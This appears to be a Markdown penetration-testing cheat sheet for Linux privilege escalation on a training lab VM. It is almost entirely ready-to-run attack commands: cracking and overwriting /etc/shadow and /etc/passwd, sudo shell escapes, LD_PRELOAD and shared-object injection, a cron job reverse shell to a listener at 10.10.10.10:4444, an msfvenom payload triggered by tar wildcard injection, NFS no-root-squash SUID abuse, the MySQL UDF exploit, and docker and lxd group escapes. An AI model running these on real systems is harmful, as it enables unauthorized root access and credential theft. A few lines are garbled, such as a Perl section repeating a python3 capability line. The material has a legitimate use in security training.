# Linux Privlage Escalation
## Table of Contents
- [Linux Privlage Escalation](#linux-privlage-escalation)
  * [Table of Contents](#table-of-contents)
    + [Basic Enumeration](#basic-enumeration)
    + [Weak File Permissions](#weak-file-permissions)
      - [Readable shadow](#readable-shadow)
      - [Writeable shadow](#writeable-shadow)
      - [Writable passwd](#writable-passwd)
    + [Passwords and Keys](#passwords-and-keys)
      - [History Files](#history-files)
      - [Config Files](#config-files)
      - [SSH Keys](#ssh-keys)
    + [Sudo-Shell escape Sequences](#sudo-shell-escape-sequences)
    + [Sudo Environment Variables](#sudo-environment-variables)
    + [Cron Jobs -File permissions](#cron-jobs--file-permissions)
    + [Cron Jobs Path Environment Variable](#cron-jobs-path-environment-variable)
    + [CronJobs - Wildcards](#cronjobs---wildcards)
    + [SUID and SGID Executables --Known Exploits](#suid-and-sgid-executables---known-exploits)
    + [SUID/SGID Executables-Shared Object Injection](#suid-sgid-executables-shared-object-injection)
    + [SUID and SGID Executables-Environment Variables](#suid-and-sgid-executables-environment-variables)
    + [SUID and SGID Executables-Abusing Shell Features 1](#suid-and-sgid-executables-abusing-shell-features-1)
    + [SUID and SGID Executables-Abusing Shell Features 2](#suid-and-sgid-executables-abusing-shell-features-2)
    + [NFS](#nfs)
    + [Service Exploits](#service-exploits)
    + [Docker Linux Local PE](#docker-linux-local-pe)
    + [lxd Group Priv Esc](#lxd-group-priv-esc)
        * [Errors-on the vulnerable server](#errors-on-the-vulnerable-server)
    + [Capabilities](#capabilities)
      - [Python](#python)
      - [Perl](#perl)
      - [Tar](#tar)

<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>

### Basic Enumeration
````
whoami
pwd
id
````
- OS, Kernel & Hostname
````
cat /etc/issue 
cat /proc/version 
hostname 
uname -a
searchsploit linux kernel 3.9
````
- To remove DoS exploits by adding -exclude=”/dos/”
### Weak File Permissions
#### Readable shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
- A users password hash (if they have one) can be found between the first and second (:) of each line.
- Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Switch to the root user
```
su root
```
#### Writeable shadow
```
ls -l /etc/shadow
```
- Generate a new password hash
```
mkpasswd -m sha-512 jackiscool
```
- Edit /etc/shadow and replace origional root user's password hash with the one that you just created
- Switch to the root user
```
su root
```
#### Writable passwd
- The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
- The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. 
````
ls -l /etc/passwd
````
- Generate a new password hash with a password of your choice:
````
openssl passwd newpasswordhere
````
- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
- Switch to the root user, using the new password:
````
su root
````
- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
- Now switch to the newroot user, using the new password:
````
su newroot
````
### Passwords and Keys
#### History Files
- If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
- View the contents of all the hidden history files in the user's home directory:
````
cat ~/.*history | less
````
- Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. 
- Note that there is no space between the -p option and the password!
#### Config Files
- Config files often contain passwords in plaintext or other reversible formats.
- List the contents of the user's home directory:
````
ls /home/user
````
- Note the presence of a myvpn.ovpn config file. View the contents of the file:
````
cat /home/user/myvpn.ovpn
````
- The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
````
su root
````
#### SSH Keys
- Sometimes users make backups of important files but fail to secure them with the correct permissions.
- Look for hidden files & directories in the system root:
````
ls -la /
````
### Sudo-Shell escape Sequences
- List the programs which sudo allows your user to run:
````
sudo -l
````
Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
- SUID
````
Sudo -l
````
- iftop
````
sudo /usr/bin/iftop
!/bin/bash #hit enter
````
- find
````
sudo /usr/bin/find . -exec /bin/bash \; -quit
````
- nano
````
sudo /usr/bin/nano
Press ctrl+r then ctrl +x 
Reset; bash 1>&0 2>&0
````
- vim
````
Sudo vim -c ‘:!/bin/bash’
````
- man
````
sudo /usr/bin/man man
!/bin/sh
````
- awk
````
sudo awk 'BEGIN {system("/bin/bash")}'
````
- less
````
sudo /usr/bin/less /etc/profile
!/bin/sh
````
- FTP
````
sudo /usr/bin/ftp
!/bin/bash
````
- NMAP
- Method 1
````
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
````
- Method 2
````
sudo nmap --interactive
!bash
````
- more
````
TERM= sudo -E more /etc/profile
!/bin/bash
````
### Sudo Environment Variables
- Sudo can be configured to inherit certain environment variables from the user's environment.
- Check which environment variables are inherited (look for the env_keep options):
- Output you're looking for
````
user@debian:~/tools/sudo$ sudo -l
Matching Default entries for user on this host:
  env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
````
````
sudo -l
````
- LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. 
- LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
- Create a shared object using the code located at /home/user/tools/sudo/preload.c:
- preload.c code in another file in this repo:
````
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
````
- Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
````
sudo LD_PRELOAD=/tmp/preload.so program-name-here
````
- A root shell should spawn. 
- Run ldd against the apache2 program file to see which shared libraries are used by the program:
````
ldd /usr/sbin/apache2
````
- Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
````
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
````
- Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
````
sudo LD_LIBRARY_PATH=/tmp apache2
````
- A root shell should spawn. 
- Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. 
- Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.
### Cron Jobs -File permissions
- Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
- Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
- View the contents of the system-wide crontab:
````
cat /etc/crontab
````
- There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
- Locate the full path of the overwrite.sh file:
````
locate overwrite.sh
````
- Note that the file is world-writable:
````
ls -l /usr/local/bin/overwrite.sh
````
- Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.
````
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
````
- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
````
nc -nvlp 4444
````
### Cron Jobs Path Environment Variable
- View the contents of the system-wide crontab:
````
cat /etc/crontab
````
- Note that the PATH variable starts with /home/user which is our user's home directory.
- Create a file called overwrite.sh in your home directory with the following contents:
````
#!/bin/bash
 
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
````
- Make sure that the file is executable:
````
chmod +x /home/user/overwrite.sh
````
- Wait for the cron job to run. Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:
````
/tmp/rootbash -p
````
### CronJobs - Wildcards
- View the contents of the other cron job script:
````
cat /usr/local/bin/compress.sh
````
- Note that the tar command is being run with a wildcard (*) in your home directory.
- Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
````
- Transfer the shell.elf file to /home/user/ on the Debian VM.
````
chmod +x /home/user/shell.elf
````
- Create these two files in /home/user:
````
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
````
- When the tar command in the cron job runs, the wildcard (*) will expand to include these files. 
- Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
- Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
````
nc -nvlp 4444
````
### SUID and SGID Executables --Known Exploits
- Find all the SUID/SGID executables on the Debian VM:
````
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
````
- Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit is in this repo. 
- Exploit-DB, Google, and GitHub are good places to search!
- Check GTFO Bins and Google for SUID/SGID!!!
### SUID/SGID Executables-Shared Object Injection
- The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
- First, execute the file and note that currently it displays a progress bar before exiting:
````
/usr/local/bin/suid-so
````
- Run strace on the file and search the output for open/access calls and for "no such file" errors:
````
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
````
- Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
- Create the .config directory for the `libcalc.so` file:
````
mkdir /home/user/.config
````
- Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
````
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
````
- Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
````
/usr/local/bin/suid-so
````
### SUID and SGID Executables-Environment Variables
- The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
- First, execute the file and note that it seems to be trying to start the apache2 webserver:
````
/usr/local/bin/suid-env
````
- Run strings on the file to look for strings of printable characters:
````
strings /usr/local/bin/suid-env
````
One line `service apache2 start` suggests that the service executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.
Compile the code `service.c` into an executable called service. This code simply spawns a Bash shell:
````
gcc -o service /home/user/tools/suid/service.c
````
- Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
````
PATH=.:$PATH /usr/local/bin/suid-env
````
### SUID and SGID Executables-Abusing Shell Features 1
- The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the apache2 webserver.
Verify this with strings:
````
strings /usr/local/bin/suid-env2
````
- In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
- Verify the version of Bash installed on the Debian VM is less than 4.2-048:
````
/bin/bash --version
````
Create a Bash function with the name `/usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved) and export the function:
````
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
````
- Run the suid-env2 executable to gain a root shell:
````
/usr/local/bin/suid-env2
````
### SUID and SGID Executables-Abusing Shell Features 2
- Note: This will not work on Bash versions 4.4 and above.
- When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
- Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of `/bin/bash`:
````
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
````
Run the `/tmp/rootbash` executable with -p to gain a shell running with root privileges:
````
/tmp/rootbash -p
````
### NFS
- Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
- Check the NFS share configuration:
````
cat /etc/exports
````
- Note that the /tmp share has root squashing disabled.
- On your Kali box, switch to your root user if you are not already running as root:
````
sudo su
````
- Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
````
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
````
- Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
````
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
````
- Still using Kali's root user, make the file executable and set the SUID permission:
````
chmod +xs /tmp/nfs/shell.elf
````
- Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
````
/tmp/shell.elf
````
### Service Exploits
- https://www.exploit-db.com/exploits/1518
- The mysql service is running as root and the 'root' user for the service does not have a password assigned or the password is known. 
- This exploit takes advantage of the User Defined Functions (UFDs) to run system commands as root via the mysql service.
- Change into the `/home/user/tools/mysql-udf` directory.
```
cd /home/user/tools/mysql-udf
```
- Compile the raptor_udf2.c exploit code using the following
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
- Connect to the mysql service as the root user with a blank or known password.
```
mysql -u root
```
- Execute the following commands on the mysql shell to create a udf "do_system" using the compiled exploit
```
use mysql;
create table foo(line blob);
insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
- Exit out of the mysql shell
```
\q
```
- Run /tmp/rootbash with -p to gain a root shell
`/tmp/rootbash -p`
### Docker Linux Local PE
```
id
```
- Check to see if the user is in the docker group
```
docker run hello-world
```
- Check to see if docker is installed and working correctly
```
docker run -v /root:/mnt alpine cat /mnt/key.txt
```
- `-v` specifies a volume to mount, in this case the /root directory on the house was mounted to the /mnt directory on the container.  Because docker has SUID we were able to mount a root owned directory in our container
```
docker run -it -v /:/mnt alpine chroot /mnt
```
- Roots the host with docker because we used chroot on the /mnt directory.  This allowed us to use the host operating system.
```
docker run -it ubuntu bash
```
- Optional: Run an ubuntu container with docker
### lxd Group Priv Esc
- Exploit without internet connection
- Change to the root user on attack box
```
sudo su
```
- Install Requirements on your attack box
```
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```
- Clone the repo (attack box)
```
sudo go get -d -v github.com/lxc/distrobuilder
```
- Make distrobuilder (attack box)
```
cd $HOME/go/src/github.com/lxc/distrobuilder
make
```
- Prepare the creation of Alpine (attack box)
```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
- Create the container (attack box)
```
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
-If that fails, run it adding `-o image.release=3.8` at the end

- Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
- Add the image on the vulnerable server
```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
```
- Second command is only if you want to confim the imported image is present
- Create a container and add the root path
```
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
- Execute the container
```
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```
- `/mnt/root` is where the file system is mounted.
##### Errors-on the vulnerable server
- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
- You need to initialize lxd before using it
```
lxd init
```
- Read the options and use the defaults
### Capabilities
- Search your whole file-system recursively with the following command:
````
getcap -r / 2>/dev/null
````
#### Python
- Looking for:
````
/home/demo/python3 = cap_setuid+ep
````
- Escalate Privlages 
````
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
````
#### Perl
- Check for Perl:
````
which perl
````
- Looking for:
````
/home/demo/python3 = cap_setuid+ep
````
- Escalate
````
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
````
#### Tar
- Check for tar:
````
which tar
````
- Looking For:
````
/home/demo/tar = cap dac read search+ep
````
- Tar the shadow:
````
./tar cvf shadow.tar /etc/shadow
````
- Untar to review:
````
./tar -xvf shadow.tar
````












